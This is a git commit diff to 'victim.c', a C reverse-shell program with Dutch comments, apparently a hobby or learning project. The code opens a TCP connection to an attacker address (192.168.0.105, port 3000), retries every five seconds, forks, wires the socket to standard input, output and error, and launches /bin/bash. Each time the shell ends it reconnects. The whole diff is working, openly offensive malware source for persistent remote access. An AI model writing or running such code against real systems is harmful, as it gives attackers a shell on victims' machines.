77de53e4f2eb8402f8439cf5645a031c7c4e0b0f
Koekje <the_cookieftw@hotmail.com>
2015-08-21 00:15:47 +0200

    fork works in a proper way now
    After the fork, parent process will be paused till the child process terminates. After that, the while loop will start again and de program will wait for a new connection to come in.

--- victim.c
+++ victim.c
@@ -1,5 +1,6 @@
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <errno.h>
@@ -7,54 +8,49 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+
  
 int main(){ 
 
-	
-    int sockfd; 		//de socket
-    int n; 				//de connectie met de socket
-    int pid; 			//het proces van de shell
-    char command[10];	//custom command
-    struct sockaddr_in attacker_addr;   
-    //socklen_t sinsize;
-    
-    
-    
+	//socket informatie, connectie informatie, proces id voor de fork() etc.
+    int socket_info;
+    int connectie;
+    int pid;
+    struct sockaddr_in aanvaller_info;
+
+
     while(1){
-	//while(1): deze code wordt altijd uitgevoerd, wat er ook gebeurt.
+	//soort socket, IPv4, poort nummer, aanvallers' IP.
+	socket_info = socket(AF_INET, SOCK_STREAM, 0);
+    aanvaller_info.sin_family = AF_INET;
+    aanvaller_info.sin_port = htons(3000);
+    aanvaller_info.sin_addr.s_addr = inet_addr("192.168.0.105");
+	printf("Set data.\n");
 	
-	sockfd = socket(AF_INET, SOCK_STREAM, 0); 					//de socket(IPv4 domein, communicatie type TCP, extra protocol 0)
-    attacker_addr.sin_family = AF_INET;							//attacker met IPv4
-    attacker_addr.sin_port = htons(3000);						//attacker poort
-    attacker_addr.sin_addr.s_addr = inet_addr("192.168.0.103");	//attacker's adres/domein
-    
-    //memset(&(attacker_addr.sin_zero),'\0',8); //voor shellcode in assembly
-    
-    
-    n = connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(struct sockaddr)); //maak connectie met attacker via de socket
-	while(n < 0){
-		//connectie is mislukt: probeer het elke 5 seconden opnieuw.
+	printf("Probeert connectie te maken.\n");
+    connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
+	while(connectie < 0){
+		printf("Connectie mislukt. Probeer opnieuw.\n");
 		sleep(5);
-		n = connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(struct sockaddr));
+		connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
     }
-    n = write(sockfd,"Connected, mah master!\n",24);
+    connectie = write(socket_info,"Connectie gemaakt met slachtoffer.\n",36);
     
-    pid = fork(); //als er een connectie is: 'kopieer' het proces
-    if(pid < 0){
-		//kopieren mislukt: ga verder met de while loop, dus probeer het opnieuw
-		continue;
+    printf("Connectie gemaakt met de aanvaller.\n");
+    
+    pid = fork();
+    if(pid > 0){
+		printf("PARENT proces; wacht tot shell proces klaar is.\n");
+		wait(NULL);
 	}
 	if(pid == 0){
-		//kopie gelukt: zorg nu dat alle input en output door de socket gaan (van/naar de attacker/victim)
-		
-		dup2(sockfd,0); // stdin
-		dup2(sockfd,1); // stdout
-		dup2(sockfd,2); // stderr
-		
-		//bin/bash wordt opgestart: alle input gaat naar de shell -> alle output gaat via de socket naar de attacker
+		printf("CHILD proces; input/output vanaf nu door de socket -> start de shell.\n");
+		dup2(socket_info,0); // input
+		dup2(socket_info,1); // output
+		dup2(socket_info,2); // errors
 		execl("/bin/bash", "/bin/bash", NULL);
 	}
-    
+    printf("CHILD is gesloten; terug naar de while loop.\n");
     
 }
 	return 0;
